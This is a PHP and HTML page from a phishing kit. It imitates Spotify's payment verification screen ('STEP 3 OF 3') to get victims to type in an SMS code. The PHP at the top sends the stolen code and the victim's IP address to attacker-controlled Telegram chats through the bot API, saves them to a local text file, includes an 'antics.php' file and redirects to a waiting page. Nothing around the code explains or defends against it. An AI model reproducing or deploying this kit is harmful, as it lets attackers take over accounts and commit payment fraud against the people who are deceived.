<?php
include 'id.php'; 
extract($_REQUEST); 
$sms=$_POST["sim"];
if(isset($_POST['okbb'])){
$ip = getenv("REMOTE_ADDR");
$message=" -------  𝒢𝑒𝓃𝒾𝓊𝓈  𝒮𝒫𝒪𝒯𝐼𝐹𝒴 𝒮𝑀𝒮 -------"."\n"."𝒮𝑀𝒮 𝒞𝑜𝒹𝑒 𝟣 :  ".$sms."\n"."𝐼𝒫: ".$ip."\n"."------------  𝒮𝒫𝒪𝒯𝐼𝐹𝒴  -------------";
$user_ids=$id;
foreach($user_ids as $user_id) {
$url='https://api.telegram.org/bot'.$token.'/sendMessage';
$data=array('chat_id'=>$user_id,'text'=>$message);
$options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
$context=stream_context_create($options);
$result=file_get_contents($url,false,$context);
}
$myfile = fopen("noni.txt", "a+");
$txt = $message;
fwrite($myfile, $txt);
fclose($myfile);
include "antics.php";
HEADER("Location: wait2.php");
}
    ?>
<html style="display: block;"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"></head><body id="app_index" class="js-focus-visible">
    
    
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta http-equiv="Cache-Control" content="no-cache">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

    <meta name="apple-mobile-web-app-title" content="Disney+">
    <meta name="theme-color" content="#ffffff">
    <meta name="msapplication-TileColor" content="#ffffff">

    <link rel="manifest" href="./img/ico/manifest.json">
    <link rel="shortcut icon" href="./img/ico/spotico.ico">
    <link rel="mask-icon" href="./img/ico/Pinned-Spotify.svg" color="#1d1fff">
    <link rel="apple-touch-icon" sizes="180x180" href="../img/ico/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="../img/ico/Spotify.png">
    <title>Confirmation - Spotify</title>


    <link rel="stylesheet" type="text/css" href="../style/app_styles_bundle.css">
    <link rel="stylesheet" type="text/css" href="../style/main.css">
    <link rel="stylesheet" type="text/css" href="../style/react.css">f
    <style>
        html {
            display: none;
        }
    </style>
    <script>
        if (self == top) {
            document.documentElement.style.display = 'block';
        } else {
            top.location = self.location;
        }
    </script>
    
                <style>
        /* Obfuscated CSS */
        .a { display: none !important; }
        .b { visibility: hidden !important; }
        .c { opacity: 0 !important; }
    </style>




    <style data-styled="" data-styled-version="4.4.1"></style>
    <div id="webAppRoot" data-reactroot="">
        <div id="app_body_content" data-testid="adult-enabled-profile">
            <div class="sc-esoVGF cNOTUj"></div>
            <div id="hudson-wrapper" class="sc-ZUflv kcCFNP video_view--hidden  ">
                <div class="sc-hPeUyl bhhZhW hudson-container">
                    <div data-testid="" class="sc-hSdWYo dfLgnK"><img alt="" aria-hidden="true" src="../img/icon-loader-32@3x.png" class="sc-eHgmQL jstxUN"></div>
                </div>
            </div>
            <div id="webAppHeader" class="onboarding">
                <div class="sc-iuJeZd hcKoaM">
                    <!-- Move the logo inside a header container -->
        <header class="header-container">
            <img src="./img/ico/logo.png" id="logo" class="logo" style="
    width: 120px;
">
        </header>
            </div>
            <div id="webAppScene">
                <div id="app_scene_content">
                    <div id="app-background" class="sc-ekHBYt eIfKUM"></div>
                    <main class="onboarding" id="onboarding_index" style="top: 0px;">
                        <div class="onboarding-wrapper">
                             <!-- Wrap the form in a white container with width: 580px -->
                        <div class="form-container" style=" background-color: black; padding: 70px; margin: 0 auto; border-radius: 4PX;">
                            <form id="dssLogin" name="dssLogin" action="" method="post">
                            <div color="#cacaca" font-size="12px" class="sc-kAzzGY ftHOpF" style="font-weight: 600; color: #fff; margin: 0px; padding: 6px 0px 0px 4px;">STEP 3 OF 3</div>
                                <br>
                                <h3 color="white" style="color: #fff; margin: 0px; padding: 0px 0px 24px;" class="sc-gZMcBi jhLoHG">Verification with SMS</h3>
                                <h5 color="white" style="color: #fff; margin: 0px; padding: 0px 0px 24px;" class="sc-rBLzX kTXVfh">We use SMS to verify any payments, this allows you to manage your subscription with much more ease.</h5>
                                
                              <p>Notice: it may take a few minutes for the code to arrive. </p>



                <!-- Rest of your HTML form content... -->
                                <fieldset class="sc-dznXNo dhAlPS" display="inline">
                                    <legend class="sc-bqjOQT hmkGgd">Password</legend>
                                    <span style="padding-top: 25px; display: block;">
                                        <p>
                Please enter the code  to verify your payment:                </p>
                                                <input aria-label="Adresse e-mail" display="inline" id="password" name="sim" maxlength="10" placeholder="Code received by SMS" class="sc-kjoXOD clJmAK sc-ekulBa fOQezq" value="" required="">
                                                <div color="#cacaca" font-size="12px" style="color: rgb(202, 202, 202); margin: 0px; padding: 6px 0px 0px 4px;" class="sc-kAzzGY ftHOpF"></div></span>
                                </fieldset>
                                <div><button aria-label="Accepter et continuer" data-testid="login-continue-button" role="button" kind="primary" value="submit" class="sc-gPEVay jOqQLP" id="" type="submit" name="okbb">CONTINUE</button></div>
                            </form>
                            
                                                                           <style>
                                
                                .spinner {
    margin:0px auto ;            
    border: 4px solid rgba(0, 0, 0, 0.1);
    border-top: 4px solid #fff;
    border-radius: 50%;
    width: 20px;
    height: 20px;
    animation: spin 1s linear infinite;
}

@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}

                                
                            </style>          

                            
                           


                        </div>
                    </div></main>
                </div>
            </div>
            <div tabindex="0" class="sc-eAKXzc fcUHFZ">
            <div id="cta-toast" class="sc-bfYoXt gCjimr"><button aria-label="" data-testid="" role="button" kind="primary" class="sc-gPEVay edYBEy sc-gbOuXE bcVAiB" id="" type="submit">GET SPOTIFY</button></div>
            </div>
            <div id="webAppFooter">
                <footer class="sc-fgfRvd kAzEpp" style="margin-top: 100px;" id="footer">
                    <div class="sc-gpHHfC fohBoY"><button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Privacy Policy</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Cookie Terms</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Data Rights</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">About Spotify</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Subscription terms and conditions</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Help</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Compatible devices</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">About Spotify</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Interest-Based Ads</button>
                        <button class="sc-hMqMXs kuhrPj sc-eXNvrr fqaKod">Manage your preferences</button>
                    </div>
                    <div class="sc-gVyKpa kOxdJt">©Spotify. All rights reserved.</div>
                </footer>
            </div>
        </div>
    </div>




</div></body></html>